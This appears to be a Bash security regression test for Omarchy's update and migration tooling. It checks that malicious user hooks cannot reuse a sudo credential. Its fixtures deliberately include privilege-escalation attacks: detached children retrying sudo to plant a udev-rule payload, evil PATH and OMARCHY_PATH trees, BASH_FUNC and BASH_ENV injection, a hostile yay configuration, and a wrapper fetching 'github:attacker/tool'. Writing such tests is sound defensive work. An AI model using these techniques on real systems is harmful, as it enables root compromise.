#!/bin/bash

set -euo pipefail

source "$(dirname "$0")/base-test.sh"

# The setuid helper below models the strongest sudo timestamp mode: one token
# shared by every process for this uid. That makes a detached hook child a
# faithful regression for both global timestamps and the easier tty-sharing
# case. The helper is mounted over /usr/bin/sudo only in this private namespace
# so the scripts must use the fixed trusted invalidation path.
if [[ ${OMARCHY_UPDATE_HOOK_SECURITY_NS:-} != 1 ]]; then
  outer_uid=$(id -u)
  outer_gid=$(id -g)
  subuid=$(awk -F: -v user="$(id -un)" '$1 == user { print $2; exit }' /etc/subuid)
  subgid=$(awk -F: -v group="$(id -gn)" '$1 == group { print $2; exit }' /etc/subgid)

  if [[ -z $subuid || -z $subgid ]]; then
    pass "no subordinate uid/gid range; skipping update-hook namespace proof"
    exit 0
  fi

  exec unshare --user --mount \
    --map-users "0:$outer_uid:1" --map-users "1:$subuid:65536" \
    --map-groups "0:$outer_gid:1" --map-groups "1:$subgid:65536" \
    env OMARCHY_UPDATE_HOOK_SECURITY_NS=1 bash "$0"
fi

[[ $(id -u) == 0 ]] || fail "update-hook proof entered its root namespace"

mount -t tmpfs -o mode=0755 tmpfs /run
run_bound=1
test_tmp=$(mktemp -d -p /run omarchy-update-hook-security.XXXXXXXX)
mount -t tmpfs -o mode=0755 tmpfs "$test_tmp"
chmod 0755 "$test_tmp"
sudo_path_bound=0
channel_paths_bound=0
channel_wrapper_tree_bound=0
aur_paths_bound=0
font_paths_bound=0
migration_pkg_paths_bound=0
etc_bound=0
persistent_pids=()
cleanup() {
  local pid pid_file
  for pid_file in "$test_home"/*.pid; do
    if [[ -s $pid_file ]]; then
      persistent_pids+=("$(<"$pid_file")")
    fi
  done
  for pid in "${persistent_pids[@]}"; do
    kill "$pid" 2>/dev/null || true
  done
  sleep 0.05
  for pid in "${persistent_pids[@]}"; do
    kill -KILL "$pid" 2>/dev/null || true
  done
  if (( sudo_path_bound )); then
    umount /usr/bin/sudo
  fi
  if (( channel_paths_bound )); then
    umount /usr/bin/pacman
    umount /usr/bin/omarchy-dev-unlink
    umount /usr/bin/omarchy-state
    umount /usr/bin/omarchy-refresh-pacman
    umount /usr/bin/omarchy-update
  fi
  if (( channel_wrapper_tree_bound )); then
    umount /usr/share/omarchy
  fi
  if (( aur_paths_bound )); then
    umount /usr/bin/omarchy-pkg-aur-accessible
    umount /usr/bin/yay
  fi
  if (( font_paths_bound )); then
    umount /usr/bin/omarchy-launch-floating-terminal-with-presentation
    umount /usr/bin/omarchy-pkg-add
    umount /usr/bin/omarchy-font-set
  fi
  if (( migration_pkg_paths_bound )); then
    umount /usr/bin/omarchy-pkg-missing
    umount /usr/bin/omarchy-pkg-add
  fi
  if (( etc_bound )); then
    umount /etc
  fi
  rm -rf "$test_tmp"/*
  umount "$test_tmp"
  rmdir "$test_tmp"
  if (( run_bound )); then
    umount /run
  fi
}
trap cleanup EXIT

stub_bin="$test_tmp/bin"
test_home="$test_tmp/home"
root_dir="$test_tmp/root"
token="$test_tmp/sudo-token"
event_log="$test_tmp/events"
hook_log="$test_home/hook-events"
mkdir -p "$stub_bin" "$test_home/.config/omarchy/hooks" "$root_dir"
mkdir -p "$test_tmp/default/omarchy/sudo-no-update"
cp "$ROOT/default/omarchy/sudo-no-update/sudo" "$test_tmp/default/omarchy/sudo-no-update/sudo"
chmod 0755 "$test_tmp/default/omarchy/sudo-no-update/sudo"
mkdir -p "$test_tmp/default/pacman"
cp "$ROOT/default/pacman"/* "$test_tmp/default/pacman/"
chmod 0755 "$test_tmp/default" "$test_tmp/default/omarchy" \
  "$test_tmp/default/omarchy/sudo-no-update" "$test_tmp/default/pacman"
chmod 0644 "$test_tmp/default/pacman"/*
touch "$event_log" "$hook_log"
chown -R 1000:1000 "$test_home"
chown 1000:1000 "$event_log"
chmod 0700 "$test_home"
chmod 0600 "$event_log" "$hook_log"
chmod 0755 "$stub_bin" "$root_dir"

cat >"$test_tmp/sudo.c" <<'C'
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

static const char *required_env(const char *name) {
  const char *value = getenv(name);
  if (!value || !*value) exit(125);
  return value;
}

static void log_event(const char *event) {
  int fd = open(required_env("TEST_SUDO_EVENT_LOG"), O_WRONLY | O_APPEND);
  if (fd < 0) exit(125);
  if (dprintf(fd, "%s\n", event) < 0) exit(125);
  close(fd);
}

static int authenticate(void) {
  int fd = open(required_env("TEST_SUDO_TOKEN"), O_WRONLY | O_CREAT | O_TRUNC, 0600);
  if (fd < 0) return 125;
  close(fd);
  return 0;
}

static int token_valid(void) {
  struct stat st;
  return stat(required_env("TEST_SUDO_TOKEN"), &st) == 0 && st.st_uid == 0;
}

static int is_pacman_command(int argc, char **argv) {
  int index;
  for (index = 1; index < argc; index++) {
    const char *base = strrchr(argv[index], '/');
    base = base ? base + 1 : argv[index];
    if (strcmp(base, "pacman") == 0) return 1;
  }
  return 0;
}

int main(int argc, char **argv) {
  int no_update = 0;
  if (argc == 2 && strcmp(argv[1], "-h") == 0) {
    const char *disable = getenv("TEST_SUDO_NO_N");
    if (disable && strcmp(disable, "1") == 0) {
      fputs("usage: sudo [-ABbEHknPS] command\n", stdout);
    } else {
      fputs("usage: sudo [-ABbEHkNnPS] command\n", stdout);
    }
    return 0;
  }
  if (argc > 1 && strcmp(argv[1], "-N") == 0) {
    no_update = 1;
    argc--;
    argv++;
  }
  if (argc > 1 && strcmp(argv[1], "--") == 0) {
    argc--;
    argv++;
  }
  if (argc == 2 && strcmp(argv[1], "--authenticate-for-test") == 0) {
    if (no_update) {
      log_event("authenticate-no-update");
      return 0;
    } else {
      log_event("authenticate");
      return authenticate();
    }
  }
  if (argc == 2 && strcmp(argv[1], "-k") == 0) {
    log_event("invalidate");
    if (unlink(required_env("TEST_SUDO_TOKEN")) < 0 && errno != ENOENT) return 125;
    return 0;
  }
  if (!token_valid() && !no_update) {
    if (is_pacman_command(argc, argv)) {
      log_event("authenticate-command");
      if (authenticate() != 0) return 125;
    } else {
      log_event("deny");
      fputs("sudo: a password is required\n", stderr);
      return 1;
    }
  }
  log_event(no_update ? "grant-no-update" : "grant");
  if (argc < 2 || setuid(0) < 0) return 125;
  execvp(argv[1], &argv[1]);
  return 125;
}
C
gcc -O2 -Wall -Wextra -o "$stub_bin/sudo" "$test_tmp/sudo.c"
chown 0:0 "$stub_bin/sudo"
chmod 4755 "$stub_bin/sudo"
mount --bind "$stub_bin/sudo" /usr/bin/sudo
sudo_path_bound=1
mount --bind "$ROOT/bin/omarchy-refresh-pacman" /usr/bin/omarchy-refresh-pacman
mount --bind "$ROOT/bin/omarchy-update" /usr/bin/omarchy-update
mount -t tmpfs -o mode=0755 tmpfs /usr/share/omarchy
mkdir -p /usr/share/omarchy/default/omarchy/sudo-no-update
cp "$ROOT/default/omarchy/sudo-no-update/sudo" /usr/share/omarchy/default/omarchy/sudo-no-update/sudo
chmod 0755 /usr/share/omarchy/default /usr/share/omarchy/default/omarchy \
  /usr/share/omarchy/default/omarchy/sudo-no-update
chmod 0755 /usr/share/omarchy/default/omarchy/sudo-no-update/sudo
channel_wrapper_tree_bound=1

# Authorize this private tree exactly as omarchy-dev-link authorizes a
# development checkout. Hiding the host /etc keeps the proof self-contained.
mount -t tmpfs -o mode=0755 tmpfs /etc
etc_bound=1
mkdir -p /etc/pacman.d
touch /etc/pacman.conf /etc/pacman.d/mirrorlist
chmod 0644 /etc/pacman.conf /etc/pacman.d/mirrorlist
printf 'root:x:0:0:root:/root:/bin/bash\n' >/etc/passwd
printf 'root:x:0:\n' >/etc/group
chmod 0644 /etc/passwd /etc/group
write_authorized_source_root() {
  local source_root="$1"
  local quoted="$source_root"

  quoted=${quoted//\\/\\\\}
  quoted=${quoted//\"/\\\"}
  quoted=${quoted//\$/\\\$}
  quoted=${quoted//\`/\\\`}
  printf 'export OMARCHY_PATH="%s"\n' "$quoted" >/etc/omarchy.conf
  chown 0:0 /etc/omarchy.conf
  chmod 0644 /etc/omarchy.conf
}
write_authorized_source_root "$test_tmp"

cat >"$test_home/launch-persistent-attack" <<'ATTACK'
#!/bin/bash
/usr/bin/setsid --fork /bin/bash -c '
  printf "%s\n" "$$" >"$3"
  for (( attempt = 0; attempt < 200; attempt++ )); do
    if /usr/bin/sudo /usr/bin/install -o 0 -g 0 -m 0600 "$1" "$2" 2>/dev/null; then
      exit 0
    fi
    /usr/bin/sleep 0.01
  done
' omarchy-hook-child "$HOME/payload" "$1" "$2"
ATTACK
cat >"$test_home/payload" <<'PAYLOAD'
RUN+="/tmp/update-hook-payload"
PAYLOAD
chown 1000:1000 "$test_home/launch-persistent-attack" "$test_home/payload"
chmod 0700 "$test_home/launch-persistent-attack"
chmod 0600 "$test_home/payload"

cat >"$stub_bin/omarchy-update-lock" <<'STUB'
#!/bin/bash
[[ ${1:-} == held ]]
STUB
cat >"$stub_bin/omarchy-update-system-pkgs" <<'STUB'
#!/bin/bash
[[ ${TEST_SKIP_UPDATE_AUTH:-0} == 1 ]] || sudo --authenticate-for-test
STUB
cat >"$stub_bin/omarchy-update-orphan-pkgs" <<'STUB'
#!/bin/bash
[[ ${TEST_SKIP_LATE_AUTH:-0} == 1 ]] || sudo --authenticate-for-test
STUB
cat >"$stub_bin/omarchy-update-aur-pkgs" <<'STUB'
#!/bin/bash
[[ ${TEST_SKIP_LATE_AUTH:-0} == 1 ]] || sudo --authenticate-for-test
STUB
cat >"$stub_bin/omarchy-update-mise" <<'STUB'
#!/bin/bash
sudo /usr/bin/true 2>/dev/null && exit 97
"$HOME/launch-persistent-attack" "$TEST_MISE_VICTIM" "$TEST_MISE_PID"
STUB
cat >"$stub_bin/omarchy-update-restart" <<'STUB'
#!/bin/bash
printf 'restart:%s\n' "$1" >>"$TEST_HOOK_LOG"
if [[ $1 == --services-only && ${TEST_SKIP_LATE_AUTH:-0} != 1 ]]; then
  sudo --authenticate-for-test
fi
STUB
cat >"$stub_bin/omarchy-update-confirm" <<'STUB'
#!/bin/bash
exit 0
STUB
cat >"$stub_bin/omarchy-migrate" <<'STUB'
#!/bin/bash
if [[ ${TEST_REAL_MIGRATE:-0} == 1 ]]; then
  exec "$TEST_ROOT/bin/omarchy-migrate"
fi
if [[ ${TEST_FAILING_STAGE:-} == signal ]]; then
  kill -TERM "$PPID"
  sleep 0.1
fi
[[ ${TEST_FAILING_STAGE:-} != migration ]]
STUB
cat >"$stub_bin/omarchy-hook" <<'STUB'
#!/bin/bash
exec bash "$TEST_ROOT/bin/omarchy-hook" "$@"
STUB
cat >"$stub_bin/omarchy-dev-unlink" <<'STUB'
#!/bin/bash
exit 0
STUB
cat >"$stub_bin/omarchy-state" <<'STUB'
#!/bin/bash
exit 0
STUB
for command in \
  omarchy-update-requires-free-space omarchy-update-pkg-prune omarchy-snapshot \
  omarchy-update-stay-awake omarchy-update-dev omarchy-update-keyring \
  omarchy-update-analyze-logs omarchy-update-status; do
  cat >"$stub_bin/$command" <<'STUB'
#!/bin/bash
exit 0
STUB
done
cat >"$stub_bin/cp" <<'STUB'
#!/bin/bash
printf 'cp:%s\n' "$*" >>"$TEST_SUDO_EVENT_LOG"
exit 0
STUB
cat >"$stub_bin/pacman" <<'STUB'
#!/bin/bash
[[ -z ${TEST_PACMAN_DELAY:-} ]] || /usr/bin/sleep "$TEST_PACMAN_DELAY"
exit "${TEST_PACMAN_STATUS:-0}"
STUB
chmod 0755 "$stub_bin"/*
chmod 4755 "$stub_bin/sudo"
mount --bind "$stub_bin/omarchy-dev-unlink" /usr/bin/omarchy-dev-unlink
mount --bind "$stub_bin/omarchy-state" /usr/bin/omarchy-state
mount --bind "$stub_bin/pacman" /usr/bin/pacman
channel_paths_bound=1

evil_update_bin="$test_home/evil-update-bin"
evil_update_root="$test_home/evil-update-root"
evil_update_marker="$test_home/evil-update-ran"
mkdir -p "$evil_update_bin" "$evil_update_root/migrations"
for command in script omarchy-migrate omarchy-update-system-pkgs; do
  cat >"$evil_update_bin/$command" <<'STUB'
#!/bin/bash
touch "$TEST_EVIL_UPDATE_MARKER"
exit 97
STUB
done
cat >"$evil_update_bin/omarchy-dev-unlink" <<'STUB'
#!/bin/bash
touch "$TEST_EVIL_CHANNEL_HELPER_MARKER"
sudo /usr/bin/install -o 0 -g 0 -m 0600 "$HOME/payload" "$TEST_EVIL_CHANNEL_VICTIM"
STUB
cat >"$evil_update_root/migrations/9999999999.sh" <<'STUB'
#!/bin/bash
sudo /usr/bin/install -o 0 -g 0 -m 0600 "$HOME/payload" "$TEST_EVIL_MIGRATION_VICTIM"
touch "$TEST_EVIL_UPDATE_MARKER"
STUB
chown -R 1000:1000 "$evil_update_bin" "$evil_update_root"
chmod 0755 "$evil_update_bin"/* "$evil_update_root/migrations/9999999999.sh"

write_attack_hook() {
  local hook_name="$1"

  mkdir -p "$test_home/.config/omarchy/hooks/$hook_name.d"
  cat >"$test_home/.config/omarchy/hooks/$hook_name" <<'HOOK'
#!/bin/bash
printf 'file:%s\n' "$(id -u)" >>"$TEST_HOOK_LOG"
sudo /usr/bin/install -o 0 -g 0 -m 0600 "$HOME/payload" "$TEST_ROOT_VICTIM" 2>/dev/null || true
"$HOME/launch-persistent-attack" "$TEST_PERSISTENT_VICTIM" "$TEST_PERSISTENT_PID"
HOOK
  cat >"$test_home/.config/omarchy/hooks/$hook_name.d/10-attack" <<'HOOK'
#!/bin/bash
printf 'directory:%s\n' "$(id -u)" >>"$TEST_HOOK_LOG"
sudo /usr/bin/install -o 0 -g 0 -m 0600 "$HOME/payload" "$TEST_ROOT_DIR_VICTIM" 2>/dev/null || true
HOOK
  chown -R 1000:1000 "$test_home/.config/omarchy/hooks/$hook_name" \
    "$test_home/.config/omarchy/hooks/$hook_name.d"
  chmod 0700 "$test_home/.config/omarchy/hooks/$hook_name" \
    "$test_home/.config/omarchy/hooks/$hook_name.d/10-attack"
}

reset_case() {
  local pid_file
  for pid_file in "$test_home"/*.pid; do
    if [[ -s $pid_file ]]; then
      persistent_pids+=("$(<"$pid_file")")
      kill "$(<"$pid_file")" 2>/dev/null || true
    fi
  done
  rm -f "$test_home"/*.pid "$token" "$root_dir"/*
  : >"$event_log"
  setpriv --reuid 1000 --regid 1000 --clear-groups /usr/bin/truncate -s 0 "$hook_log"
}

run_as_user() {
  setpriv --reuid 1000 --regid 1000 --clear-groups \
    env HOME="$test_home" PATH="$stub_bin:/usr/bin:/bin" OMARCHY_PATH="$ROOT" \
      TEST_ROOT="$ROOT" TEST_SUDO_TOKEN="$token" TEST_SUDO_EVENT_LOG="$event_log" \
      TEST_HOOK_LOG="$hook_log" "$@"
}

authenticate_for_test() {
  TEST_SUDO_TOKEN="$token" TEST_SUDO_EVENT_LOG="$event_log" \
    /usr/bin/sudo --authenticate-for-test
}

wait_for_persistent_attempts() {
  local pid_file="$1"
  local pid=""
  for (( attempt = 0; attempt < 100; attempt++ )); do
    [[ -s $pid_file ]] && break
    sleep 0.01
  done
  [[ -s $pid_file ]] || fail "detached hook child did not start"
  pid=$(<"$pid_file")
  persistent_pids+=("$pid")
  sleep 0.2
}

assert_hook_sandboxed() {
  local direct_victim="$1"
  local directory_victim="$2"
  local persistent_victim="$3"

  [[ ! -e $direct_victim && ! -e $directory_victim && ! -e $persistent_victim ]] ||
    fail "hook code reused an Omarchy sudo credential"
  grep -qxF 'file:1000' "$hook_log" || fail "the regular hook did not run as the desktop user"
  grep -qxF 'directory:1000' "$hook_log" || fail "the hook-directory entry did not run as the desktop user"
  [[ ! -e $token ]] || fail "the workflow left its modeled sudo credential live"
}

write_attack_hook post-update
update_victim="$root_dir/80-update-hook.rules"
update_dir_victim="$root_dir/81-update-hook-dir.rules"
update_persistent_victim="$root_dir/82-update-hook-child.rules"
mise_victim="$root_dir/83-mise-child.rules"
reset_case
set +e
run_as_user env PATH="$evil_update_bin:$stub_bin:/usr/bin:/bin" OMARCHY_PATH="$evil_update_root" \
  TEST_EVIL_UPDATE_MARKER="$evil_update_marker" \
  TEST_ROOT_VICTIM="$update_victim" TEST_ROOT_DIR_VICTIM="$update_dir_victim" \
  TEST_PERSISTENT_VICTIM="$update_persistent_victim" TEST_PERSISTENT_PID="$test_home/update.pid" \
  TEST_MISE_VICTIM="$mise_victim" TEST_MISE_PID="$test_home/mise.pid" \
  OMARCHY_UPDATE_LOGGED=1 "$ROOT/bin/omarchy-update" -y \
  >"$test_tmp/update.out" 2>"$test_tmp/update.err"
status=$?
set -e
(( status == 0 )) || fail "isolated unattended update failed" "$(<"$test_tmp/update.err")"
wait_for_persistent_attempts "$test_home/update.pid"
wait_for_persistent_attempts "$test_home/mise.pid"
assert_hook_sandboxed "$update_victim" "$update_dir_victim" "$update_persistent_victim"
[[ ! -e $mise_victim ]] || fail "detached mise code observed a later update authorization"
[[ ! -e $evil_update_marker ]] || fail "update trusted an inherited PATH or OMARCHY_PATH override"
grep -qxF 'restart:--services-only' "$hook_log" || fail "privileged restart phase did not run before user code"
grep -qxF 'restart:--reboot-only' "$hook_log" || fail "reboot-only phase did not run after user code"
pass "update leaves no later sudo authentication for mise or persistent hook children"

# OM-SEC-14 ends at the final cold hook boundary. Later sections exercise
# separate migration, restart-marker, channel, and installer findings in their
# own PRs.
exit 0

# Exercise the real migration dispatcher separately from PATH spoofing. An old
# update inherited the evil root here and ran its migration with the live
# system-package credential; the fixed update exports the authorized root.
evil_migration_victim="$root_dir/90-evil-migration.rules"
reset_case
set +e
run_as_user env OMARCHY_PATH="$evil_update_root" TEST_REAL_MIGRATE=1 \
  TEST_EVIL_UPDATE_MARKER="$evil_update_marker" TEST_EVIL_MIGRATION_VICTIM="$evil_migration_victim" \
  TEST_ROOT_VICTIM="$update_victim" TEST_ROOT_DIR_VICTIM="$update_dir_victim" \
  TEST_PERSISTENT_VICTIM="$update_persistent_victim" TEST_PERSISTENT_PID="$test_home/update.pid" \
  TEST_MISE_VICTIM="$mise_victim" TEST_MISE_PID="$test_home/mise.pid" \
  OMARCHY_MIGRATION_STATE="$test_home/migration-state" OMARCHY_UPDATE_LOGGED=1 \
  "$ROOT/bin/omarchy-update" -y >"$test_tmp/update-root-spoof.out" 2>"$test_tmp/update-root-spoof.err"
status=$?
set -e
(( status == 0 )) || fail "authorized-root update with real migration dispatcher failed"
[[ ! -e $evil_update_marker && ! -e $evil_migration_victim ]] ||
  fail "update dispatched a migration from inherited OMARCHY_PATH"
pass "update rejects inherited OMARCHY_PATH for real migration dispatch"

# The login-notification workflow invokes omarchy-migrate directly, outside an
# update that already normalized OMARCHY_PATH. It must independently reject an
# inherited attacker tree rather than running the migration placed there.
reset_case
set +e
run_as_user env OMARCHY_PATH="$evil_update_root" \
  TEST_EVIL_UPDATE_MARKER="$evil_update_marker" TEST_EVIL_MIGRATION_VICTIM="$evil_migration_victim" \
  OMARCHY_MIGRATION_STATE="$test_home/direct-migration-state" \
  "$ROOT/bin/omarchy-migrate" >"$test_tmp/direct-migrate.out" 2>"$test_tmp/direct-migrate.err"
status=$?
set -e
(( status == 0 )) || fail "direct authorized migration dispatch failed"
[[ ! -e $evil_update_marker && ! -e $evil_migration_victim ]] ||
  fail "direct migration dispatch trusted inherited OMARCHY_PATH"
pass "direct migration dispatch derives its source from root-owned configuration"

# Reproduce the real historical ordering that exposed the remaining gap: the
# mise-wrapper migration can execute user tooling at 1784909971, while the
# 1784914435 migration invokes sudo later. A following migration also invokes
# the real absolute-path package helper, which cannot be protected by PATH
# alone. Every later authorization must inherit the exported no-update policy.
mkdir -p "$test_tmp/migrations" "$test_home/.local/bin"
chmod 0755 "$test_tmp/migrations"
cp "$ROOT/migrations/1784909971.sh" "$test_tmp/migrations/1784909971.sh"
cp "$ROOT/migrations/1784914435.sh" "$test_tmp/migrations/1784914435.sh"
cat >"$test_tmp/migrations/1784914436.sh" <<'STUB'
#!/bin/bash
/usr/bin/omarchy-pkg-add migration-security-fixture
STUB
chmod 0644 "$test_tmp/migrations/1784909971.sh" "$test_tmp/migrations/1784914435.sh" \
  "$test_tmp/migrations/1784914436.sh"
cat >"$test_home/.local/bin/legacy-mise-wrapper" <<'STUB'
#!/bin/bash
mise use -g "github:attacker/tool"
exec "attacker-tool" "$@"
STUB
cat >"$stub_bin/omarchy-mise-install" <<'STUB'
#!/bin/bash
"$HOME/launch-persistent-attack" "$TEST_MIGRATION_VICTIM" "$TEST_MIGRATION_PID"
STUB
cat >"$stub_bin/nmcli" <<'STUB'
#!/bin/bash
printf '%s\n' "$(id -u)" >"$TEST_PRIV_MIGRATION_MARKER"
STUB
cat >"$stub_bin/omarchy-notification-dismiss" <<'STUB'
#!/bin/bash
exit 0
STUB
chmod 0755 "$stub_bin/omarchy-mise-install" "$stub_bin/nmcli" \
  "$stub_bin/omarchy-notification-dismiss" "$test_home/.local/bin/legacy-mise-wrapper"
chown -R 1000:1000 "$test_home/.local"
cat >"$stub_bin/omarchy-pkg-missing" <<'STUB'
#!/bin/bash
exit 0
STUB
chmod 0755 "$stub_bin/omarchy-pkg-missing"
mount --bind "$ROOT/bin/omarchy-pkg-add" /usr/bin/omarchy-pkg-add
mount --bind "$stub_bin/omarchy-pkg-missing" /usr/bin/omarchy-pkg-missing
migration_pkg_paths_bound=1
migration_victim="$root_dir/95-migration-child.rules"
migration_marker="$root_dir/96-privileged-migration-ran"
reset_case
set +e
run_as_user env OMARCHY_PATH="$evil_update_root" \
  TEST_MIGRATION_VICTIM="$migration_victim" TEST_MIGRATION_PID="$test_home/migration.pid" \
  TEST_PRIV_MIGRATION_MARKER="$migration_marker" TEST_PACMAN_DELAY=0.2 \
  OMARCHY_MIGRATION_STATE="$test_home/mixed-migration-state" \
  "$ROOT/bin/omarchy-migrate" >"$test_tmp/mixed-migrate.out" 2>"$test_tmp/mixed-migrate.err"
status=$?
set -e
(( status == 0 )) || fail "real mixed-trust migration sequence failed" "$(<"$test_tmp/mixed-migrate.err")"
wait_for_persistent_attempts "$test_home/migration.pid"
[[ -f $migration_marker && $(<"$migration_marker") == 0 ]] || fail "later privileged migration did not run as root"
[[ ! -e $migration_victim && ! -e $token ]] || fail "mise migration child reused a later migration authorization"
(( $(grep -c '^grant-no-update$' "$event_log") >= 2 )) ||
  fail "direct package-helper migration did not inherit the no-update policy"
pass "real mise-before-sudo and absolute package-helper migrations publish no reusable timestamp"
umount /usr/bin/omarchy-pkg-missing
umount /usr/bin/omarchy-pkg-add
migration_pkg_paths_bound=0

# Bash can import both BASH_ENV startup code and exported functions before an
# ordinary script body. An exported sudo function used to bypass the PATH
# wrapper in a later helper, publishing a global token to a BASH_ENV child that
# had started before migration invalidation. Exercise both injection channels
# through a normal-shebang child of the privileged migration shell.
cat >"$test_tmp/migrations/9999999998.sh" <<'STUB'
#!/bin/bash
"$HOME/launch-persistent-attack" "$TEST_BASH_STARTUP_VICTIM" "$TEST_BASH_STARTUP_PID"
omarchy-exported-function-auth
STUB
cat >"$stub_bin/omarchy-exported-function-auth" <<'STUB'
#!/bin/bash
sudo --authenticate-for-test
STUB
cat >"$test_home/bash-env-attack" <<'STUB'
#!/bin/bash
if [[ ! -e $TEST_BASH_ENV_MARKER ]]; then
  /usr/bin/touch "$TEST_BASH_ENV_MARKER"
  "$HOME/launch-persistent-attack" "$TEST_BASH_ENV_VICTIM" "$TEST_BASH_ENV_PID"
fi
STUB
chmod 0755 "$test_tmp/migrations/9999999998.sh" "$stub_bin/omarchy-exported-function-auth"
chown 1000:1000 "$test_home/bash-env-attack"
chmod 0600 "$test_home/bash-env-attack"
bash_startup_victim="$root_dir/99-exported-function-child.rules"
bash_env_victim="$root_dir/100-bash-env-child.rules"
bash_env_marker="$test_home/bash-env-ran"
reset_case
set +e
run_as_user env \
  'BASH_FUNC_sudo%%=() { /usr/bin/sudo "$@"; }' \
  TEST_MULTILINE_ENV=$'value\nBASH_FUNC_fake%%=not-an-environment-record' \
  BASH_ENV="$test_home/bash-env-attack" \
  TEST_BASH_ENV_MARKER="$bash_env_marker" \
  TEST_BASH_ENV_VICTIM="$bash_env_victim" TEST_BASH_ENV_PID="$test_home/bash-env.pid" \
  TEST_BASH_STARTUP_VICTIM="$bash_startup_victim" TEST_BASH_STARTUP_PID="$test_home/bash-startup.pid" \
  OMARCHY_MIGRATION_STATE="$test_home/bash-startup-migration-state" \
  "$ROOT/bin/omarchy-migrate" >"$test_tmp/bash-startup.out" 2>"$test_tmp/bash-startup.err"
status=$?
set -e
(( status == 0 )) || fail "migration rejected a sanitized Bash startup environment" "$(<"$test_tmp/bash-startup.err")"
wait_for_persistent_attempts "$test_home/bash-startup.pid"
sleep 0.2
[[ ! -e $bash_env_marker && ! -e $bash_env_victim ]] ||
  fail "BASH_ENV ran before or beneath the migration security boundary"
[[ ! -e $bash_startup_victim && ! -e $token ]] ||
  fail "an exported sudo function published a reusable migration credential"
grep -q '^grant-no-update$' "$event_log" || fail "sanitized helper did not use sudo --no-update"
grep -qxF 'exec /usr/bin/sudo -N -- "$@"' "$ROOT/default/omarchy/sudo-no-update/sudo" ||
  fail "no-update sudo wrapper omitted the option terminator"
pass "Bash startup injection cannot bypass the no-update sudo boundary"

# Invoking a mixed-trust entrypoint with an ordinary explicit Bash bypasses its
# shebang. A BASH_ENV can erase its own environment record and retain a DEBUG
# trap, so environment-record cleanup alone is not a sufficient startup gate.
# The exact interpreter argv/privileged-mode check must reject this process
# before update authentication, leaving even its already-detached child cold.
cat >"$test_home/self-erasing-bash-env" <<'STUB'
#!/bin/bash
unset BASH_ENV ENV
trap '
  if [[ ! -e $TEST_DEBUG_TRAP_MARKER ]]; then
    /usr/bin/touch "$TEST_DEBUG_TRAP_MARKER"
    "$HOME/launch-persistent-attack" "$TEST_DEBUG_TRAP_VICTIM" "$TEST_DEBUG_TRAP_PID"
  fi
' DEBUG
STUB
chown 1000:1000 "$test_home/self-erasing-bash-env"
chmod 0600 "$test_home/self-erasing-bash-env"
debug_trap_marker="$test_home/debug-trap-ran"
debug_trap_victim="$root_dir/101-debug-trap-child.rules"
reset_case
set +e
run_as_user env BASH_ENV="$test_home/self-erasing-bash-env" \
  TEST_DEBUG_TRAP_MARKER="$debug_trap_marker" TEST_DEBUG_TRAP_VICTIM="$debug_trap_victim" \
  TEST_DEBUG_TRAP_PID="$test_home/debug-trap.pid" OMARCHY_UPDATE_LOGGED=1 \
  /usr/bin/bash "$ROOT/bin/omarchy-update" -y \
  >"$test_tmp/unsafe-bash.out" 2>"$test_tmp/unsafe-bash.err"
status=$?
set -e
(( status == 126 )) || fail "update did not reject an unsafe explicit Bash interpreter"
[[ -e $debug_trap_marker ]] || fail "self-erasing BASH_ENV regression did not install its DEBUG trap"
wait_for_persistent_attempts "$test_home/debug-trap.pid"
[[ ! -e $debug_trap_victim && ! -e $token ]] ||
  fail "unsafe Bash startup reached update authentication"
! grep -qE '^(authenticate|authenticate-command|grant|grant-no-update)$' "$event_log" ||
  fail "unsafe Bash startup reached privileged update work"
grep -q 'unsafe Bash startup' "$test_tmp/unsafe-bash.err" ||
  fail "unsafe Bash startup rejection lacked a diagnostic"
pass "self-erasing BASH_ENV and DEBUG traps cannot cross the interpreter gate"

# Model a hostile yay configuration that selects absolute /usr/bin/sudo and a
# refresh loop. The real AUR helper must override both on its command line, so
# even a migration child already polling the global token sees no credential.
cat >"$stub_bin/omarchy-pkg-aur-accessible" <<'STUB'
#!/bin/bash
exit 0
STUB
cat >"$stub_bin/yay" <<'STUB'
#!/bin/bash
sudo_command=/usr/bin/sudo
sudoflags=""
sudoloop=true
while (($#)); do
  case "$1" in
    --sudo)
      sudo_command="$2"
      shift 2
      ;;
    --sudoloop=false)
      sudoloop=false
      shift
      ;;
    --sudoflags=-N)
      sudoflags=-N
      shift
      ;;
    *)
      shift
      ;;
  esac
done
printf 'sudo=%s sudoflags=%s sudoloop=%s\n' "$sudo_command" "$sudoflags" "$sudoloop" >"$TEST_YAY_LOG"
"$sudo_command" $sudoflags --authenticate-for-test
STUB
chmod 0755 "$stub_bin/omarchy-pkg-aur-accessible" "$stub_bin/yay"
mount --bind "$stub_bin/omarchy-pkg-aur-accessible" /usr/bin/omarchy-pkg-aur-accessible
mount --bind "$stub_bin/yay" /usr/bin/yay
aur_paths_bound=1
yay_victim="$root_dir/97-yay-override-child.rules"
reset_case
run_as_user env TEST_YAY_LOG="$test_home/yay.log" \
  "$test_home/launch-persistent-attack" "$yay_victim" "$test_home/yay-child.pid"
wait_for_persistent_attempts "$test_home/yay-child.pid"
run_as_user env OMARCHY_PATH="$test_tmp" OMARCHY_SUDO_NO_UPDATE=1 TEST_YAY_LOG="$test_home/yay.log" \
  "$ROOT/bin/omarchy-update-aur-pkgs" >"$test_tmp/yay.out" 2>"$test_tmp/yay.err"
sleep 0.2
grep -qxF "sudo=/usr/bin/sudo sudoflags=-N sudoloop=false" "$test_home/yay.log" ||
  fail "AUR update did not override hostile yay sudo settings"
[[ ! -e $yay_victim && ! -e $token ]] || fail "hostile yay sudo configuration published a reusable timestamp"
pass "AUR updates force no-update sudo and disable yay's credential loop"

# A pre-existing credential and skipped package paths exercise the interactive
# branch independently of authority acquired by update helpers.
reset_case
authenticate_for_test
set +e
run_as_user env TEST_SKIP_UPDATE_AUTH=1 TEST_SKIP_LATE_AUTH=1 \
  TEST_ROOT_VICTIM="$update_victim" TEST_ROOT_DIR_VICTIM="$update_dir_victim" \
  TEST_PERSISTENT_VICTIM="$update_persistent_victim" TEST_PERSISTENT_PID="$test_home/update.pid" \
  TEST_MISE_VICTIM="$mise_victim" TEST_MISE_PID="$test_home/mise.pid" \
  OMARCHY_UPDATE_LOGGED=1 "$ROOT/bin/omarchy-update" \
  >"$test_tmp/update-interactive.out" 2>"$test_tmp/update-interactive.err"
status=$?
set -e
(( status == 0 )) || fail "isolated interactive update failed"
